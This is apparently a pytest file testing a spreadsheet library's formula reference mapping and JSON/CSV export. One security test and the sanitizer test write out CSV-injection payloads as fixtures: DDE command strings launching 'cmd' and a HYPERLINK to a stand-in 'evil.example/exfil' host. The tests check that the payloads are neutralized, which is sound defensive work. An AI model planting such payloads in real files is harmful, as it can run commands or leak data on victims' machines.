"""
Phase 3: Formula Tools Tests

Tests for:
- FormulaReferenceMapper (extract and map cell references)
- FormulaSubstitution (find/replace in formulas)
- FormulaSerializer (export/import)
"""

import pytest
import json
import tempfile
import os
from streamxl import FormulaReferenceMapper, FormulaSerializer


class TestFormulaReferenceMapper:
    """Test cell reference extraction and mapping."""

    def test_extract_single_reference(self):
        """Extract single cell reference."""
        refs = FormulaReferenceMapper.extract_cell_refs("=A1")
        assert refs == ["A1"]

    def test_extract_multiple_references(self):
        """Extract multiple cell references."""
        refs = FormulaReferenceMapper.extract_cell_refs("=A1+B2")
        assert set(refs) == {"A1", "B2"}

    def test_extract_range_references(self):
        """Extract range references."""
        refs = FormulaReferenceMapper.extract_cell_refs("=SUM(A1:A10)")
        assert set(refs) == {"A1", "A10"}

    def test_extract_absolute_references(self):
        """Extract absolute references with $ signs."""
        refs = FormulaReferenceMapper.extract_cell_refs("=$A$1+B2")
        assert set(refs) == {"$A$1", "B2"}

    def test_extract_ranges_simple(self):
        """Extract range tuples."""
        ranges = FormulaReferenceMapper.extract_ranges("=SUM(A1:A10)")
        assert ranges == [("A1", "A10")]

    def test_extract_ranges_multiple(self):
        """Extract multiple ranges."""
        ranges = FormulaReferenceMapper.extract_ranges("=SUM(A1:A10, C5:C15)")
        assert ranges == [("A1", "A10"), ("C5", "C15")]

    def test_extract_ranges_absolute(self):
        """Extract absolute ranges."""
        ranges = FormulaReferenceMapper.extract_ranges("=SUM($A$1:$A$10)")
        assert ranges == [("$A$1", "$A$10")]

    def test_map_cell_coordinates_simple(self):
        """Map cell coordinates with simple offset."""
        result = FormulaReferenceMapper.map_cell_coordinates("=A1", row_offset=1, col_offset=1)
        assert result == "=B2"

    def test_map_cell_coordinates_multiple_cells(self):
        """Map multiple cell references."""
        result = FormulaReferenceMapper.map_cell_coordinates("=A1+B2", row_offset=1, col_offset=1)
        assert result == "=B2+C3"

    def test_map_cell_coordinates_preserve_absolute_row(self):
        """Preserve absolute row references."""
        result = FormulaReferenceMapper.map_cell_coordinates(
            "=A$1+B2", row_offset=2, col_offset=1
        )
        assert result == "=B$1+C4"

    def test_map_cell_coordinates_preserve_absolute_col(self):
        """Preserve absolute column references."""
        result = FormulaReferenceMapper.map_cell_coordinates(
            "=$A1+B2", row_offset=2, col_offset=1
        )
        assert result == "=$A3+C4"

    def test_map_cell_coordinates_preserve_both_absolute(self):
        """Preserve both absolute references."""
        result = FormulaReferenceMapper.map_cell_coordinates(
            "=$A$1+B2", row_offset=2, col_offset=1
        )
        assert result == "=$A$1+C4"

    def test_map_cell_coordinates_negative_offset(self):
        """Map with negative offsets."""
        result = FormulaReferenceMapper.map_cell_coordinates("=C3", row_offset=-1, col_offset=-1)
        assert result == "=B2"

    def test_map_cell_coordinates_no_offset(self):
        """Return unchanged formula when offset is zero."""
        result = FormulaReferenceMapper.map_cell_coordinates("=A1+B2")
        assert result == "=A1+B2"

    def test_col_to_num_single_letter(self):
        """Convert single letter column to number."""
        assert FormulaReferenceMapper._col_to_num("A") == 1
        assert FormulaReferenceMapper._col_to_num("Z") == 26

    def test_col_to_num_double_letter(self):
        """Convert double letter column to number."""
        assert FormulaReferenceMapper._col_to_num("AA") == 27
        assert FormulaReferenceMapper._col_to_num("AB") == 28
        assert FormulaReferenceMapper._col_to_num("AZ") == 52

    def test_num_to_col_single_digit(self):
        """Convert number to single letter column."""
        assert FormulaReferenceMapper._num_to_col(1) == "A"
        assert FormulaReferenceMapper._num_to_col(26) == "Z"

    def test_num_to_col_double_digit(self):
        """Convert number to double letter column."""
        assert FormulaReferenceMapper._num_to_col(27) == "AA"
        assert FormulaReferenceMapper._num_to_col(28) == "AB"
        assert FormulaReferenceMapper._num_to_col(52) == "AZ"

    def test_get_affected_cells(self):
        """Get list of affected cell coordinates."""
        cells = FormulaReferenceMapper.get_affected_cells("=A1+B2")
        assert (0, 0) in cells  # A1 = row 0, col 0
        assert (1, 1) in cells  # B2 = row 1, col 1

    def test_get_affected_cells_range(self):
        """Get affected cells from range."""
        cells = FormulaReferenceMapper.get_affected_cells("=SUM(A1:A3)")
        assert (0, 0) in cells  # A1
        assert (2, 0) in cells  # A3

    def test_substitute_reference_simple(self):
        """Substitute single cell reference."""
        result = FormulaReferenceMapper.substitute_reference("=A1+B2", "A1", "C5")
        assert result == "=C5+B2"

    def test_substitute_reference_preserves_others(self):
        """Substitution doesn't affect other references."""
        result = FormulaReferenceMapper.substitute_reference("=A1+A2", "A1", "B1")
        assert result == "=B1+A2"

    def test_substitute_reference_case_insensitive(self):
        """Case insensitive substitution."""
        result = FormulaReferenceMapper.substitute_reference(
            "=a1+b2", "A1", "C5", case_sensitive=False
        )
        assert result == "=C5+b2"


class TestFormulaSerializer:
    """Test formula export/import."""

    @pytest.fixture
    def sample_rows_with_metadata(self):
        """Create sample rows with metadata."""
        return [
            [
                {"value": "Name", "formula": None, "formula_type": None},
                {"value": "Total", "formula": None, "formula_type": None},
            ],
            [
                {"value": "Alice", "formula": None, "formula_type": None},
                {"value": None, "formula": "SUM(A1:A10)", "formula_type": "sum"},
            ],
            [
                {"value": "Bob", "formula": None, "formula_type": None},
                {"value": None, "formula": "AVERAGE(A1:A10)", "formula_type": "average"},
            ],
        ]

    def test_export_formulas(self, sample_rows_with_metadata):
        """Export formulas to dict."""
        export = FormulaSerializer.export_formulas(sample_rows_with_metadata)
        assert "version" in export
        assert "sheets" in export
        assert "metadata" in export

    def test_export_formulas_structure(self, sample_rows_with_metadata):
        """Verify export structure."""
        export = FormulaSerializer.export_formulas(sample_rows_with_metadata, "Data")
        assert export["version"] == "1.0"
        assert "Data" in export["sheets"]
        assert "(1, 1)" in export["sheets"]["Data"]
        assert export["sheets"]["Data"]["(1, 1)"]["formula"] == "SUM(A1:A10)"

    def test_export_formulas_types(self, sample_rows_with_metadata):
        """Export includes formula types."""
        export = FormulaSerializer.export_formulas(sample_rows_with_metadata)
        data = export["sheets"]["Sheet1"]
        assert data["(1, 1)"]["type"] == "sum"
        assert data["(2, 1)"]["type"] == "average"

    def test_export_to_json(self, sample_rows_with_metadata):
        """Export to JSON file."""
        with tempfile.NamedTemporaryFile(suffix=".json", delete=False) as tmp:
            tmp_path = tmp.name

        try:
            FormulaSerializer.export_to_json(sample_rows_with_metadata, tmp_path)
            assert os.path.exists(tmp_path)

            # Verify content
            with open(tmp_path) as f:
                data = json.load(f)
            assert data["version"] == "1.0"
            assert "Sheet1" in data["sheets"]
        finally:
            os.unlink(tmp_path)

    def test_export_to_csv(self, sample_rows_with_metadata):
        """Export to CSV file."""
        with tempfile.NamedTemporaryFile(suffix=".csv", delete=False) as tmp:
            tmp_path = tmp.name

        try:
            FormulaSerializer.export_to_csv(sample_rows_with_metadata, tmp_path)
            assert os.path.exists(tmp_path)

            # Verify content
            with open(tmp_path) as f:
                lines = f.readlines()
            assert "row,col,formula,type,value" in lines[0]
            assert "SUM(A1:A10)" in "".join(lines)
        finally:
            os.unlink(tmp_path)

    def test_export_to_csv_neutralizes_formula_injection(self):
        """
        SECURITY: export_to_csv() must neutralize CSV/formula-injection
        payloads (CWE-1236 / OWASP "CSV Injection").

        Cell content originates from an untrusted .xlsx file. A malicious
        workbook can contain formula text or values that start with
        =, +, -, or @ (e.g. DDE payloads like "cmd|'/c calc'!A0" written as
        a formula starting with '+' or '@', or a computed value equal to
        "=HYPERLINK(...)"). If written verbatim to CSV, opening the export
        in Excel/LibreOffice/Google Sheets executes it as a formula. Every
        such value must come out prefixed with a leading apostrophe so it
        is rendered as inert text.
        """
        malicious_rows = [
            [{"value": "Name", "formula": None, "formula_type": None}],
            # Formula text (no leading '=' — matches internal representation)
            # crafted to start with each trigger character.
            [{"value": None, "formula": "+cmd|'/c calc'!A0", "formula_type": "custom"}],
            [{"value": None, "formula": "-2+3+cmd|'/c calc'!A0", "formula_type": "custom"}],
            [{"value": None, "formula": "@SUM(1+1)*cmd|'/c calc'!A0", "formula_type": "custom"}],
            # A computed value that itself is an injection payload.
            [
                {
                    "value": '=HYPERLINK("http://evil.example/exfil","click")',
                    "formula": "INDIRECT(A1)",
                    "formula_type": "custom",
                }
            ],
        ]

        with tempfile.NamedTemporaryFile(suffix=".csv", delete=False) as tmp:
            tmp_path = tmp.name

        try:
            FormulaSerializer.export_to_csv(malicious_rows, tmp_path)

            with open(tmp_path, newline="") as f:
                raw = f.read()

            # The raw payloads must never appear unescaped/unprefixed —
            # i.e. never immediately following a CSV field-start quote/comma
            # with the trigger character as the first character of the field.
            assert ',"+cmd' not in raw
            assert ',"-2+3' not in raw
            assert ',"@SUM' not in raw
            assert '"=HYPERLINK' not in raw

            # And the neutralized (apostrophe-prefixed) forms must be present.
            assert "'+cmd|'/c calc'!A0" in raw
            assert "'-2+3+cmd|'/c calc'!A0" in raw
            assert "'@SUM(1+1)*cmd|'/c calc'!A0" in raw
            assert "'=HYPERLINK(" in raw

            # Round-trip through csv.reader to confirm each affected field's
            # first character is now a literal apostrophe, not the trigger.
            import csv as _csv

            with open(tmp_path, newline="") as f:
                rows = list(_csv.reader(f))
            data_rows = rows[1:]
            assert data_rows[0][2].startswith("'+")
            assert data_rows[1][2].startswith("'-")
            assert data_rows[2][2].startswith("'@")
            assert data_rows[3][4].startswith("'=")
        finally:
            os.unlink(tmp_path)

    def test_sanitize_csv_cell_directly(self):
        """Unit-level check of the sanitizer used by export_to_csv()."""
        from streamxl.security import sanitize_csv_cell

        assert sanitize_csv_cell("=cmd|'/c calc'!A0") == "'=cmd|'/c calc'!A0"
        assert sanitize_csv_cell("+1+1") == "'+1+1"
        assert sanitize_csv_cell("-1+1") == "'-1+1"
        assert sanitize_csv_cell("@SUM(1+1)") == "'@SUM(1+1)"
        assert sanitize_csv_cell("\tevil") == "'\tevil"
        assert sanitize_csv_cell("\revil") == "'\revil"
        # Safe values pass through untouched.
        assert sanitize_csv_cell("Alice") == "Alice"
        assert sanitize_csv_cell("SUM(A1:A10)") == "SUM(A1:A10)"
        assert sanitize_csv_cell(None) is None
        assert sanitize_csv_cell(-42) == -42
        assert sanitize_csv_cell(3.14) == 3.14
        assert sanitize_csv_cell("") == ""

    def test_import_formulas(self, sample_rows_with_metadata):
        """Import formulas from JSON file."""
        with tempfile.NamedTemporaryFile(suffix=".json", delete=False) as tmp:
            tmp_path = tmp.name

        try:
            # Export first
            FormulaSerializer.export_to_json(sample_rows_with_metadata, tmp_path)

            # Then import
            imported = FormulaSerializer.import_formulas(tmp_path)
            assert imported["version"] == "1.0"
            assert "Sheet1" in imported["sheets"]
        finally:
            os.unlink(tmp_path)

    def test_get_formula_stats(self, sample_rows_with_metadata):
        """Get formula statistics."""
        stats = FormulaSerializer.get_formula_stats(sample_rows_with_metadata)
        assert stats["total_cells"] == 6  # 2 rows × 3 cols = 6
        assert stats["formula_cells"] == 2
        assert stats["formula_percentage"] > 0
        assert "sum" in stats["by_type"]
        assert "average" in stats["by_type"]

    def test_get_formula_stats_counts(self, sample_rows_with_metadata):
        """Verify formula statistics counts."""
        stats = FormulaSerializer.get_formula_stats(sample_rows_with_metadata)
        assert stats["by_type"]["sum"] == 1
        assert stats["by_type"]["average"] == 1

    def test_validate_export_format_valid(self, sample_rows_with_metadata):
        """Validate correct export format."""
        export = FormulaSerializer.export_formulas(sample_rows_with_metadata)
        assert FormulaSerializer.validate_export_format(export)

    def test_validate_export_format_missing_version(self, sample_rows_with_metadata):
        """Validation fails without version."""
        export = FormulaSerializer.export_formulas(sample_rows_with_metadata)
        del export["version"]
        assert not FormulaSerializer.validate_export_format(export)

    def test_validate_export_format_missing_sheets(self, sample_rows_with_metadata):
        """Validation fails without sheets."""
        export = FormulaSerializer.export_formulas(sample_rows_with_metadata)
        del export["sheets"]
        assert not FormulaSerializer.validate_export_format(export)

    def test_roundtrip_export_import(self, sample_rows_with_metadata):
        """Test export/import roundtrip."""
        with tempfile.NamedTemporaryFile(suffix=".json", delete=False) as tmp:
            tmp_path = tmp.name

        try:
            # Export
            FormulaSerializer.export_to_json(sample_rows_with_metadata, tmp_path)

            # Import
            imported = FormulaSerializer.import_formulas(tmp_path)

            # Verify data matches
            original = FormulaSerializer.export_formulas(sample_rows_with_metadata)
            assert imported["version"] == original["version"]
            assert imported["sheets"] == original["sheets"]
        finally:
            os.unlink(tmp_path)


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
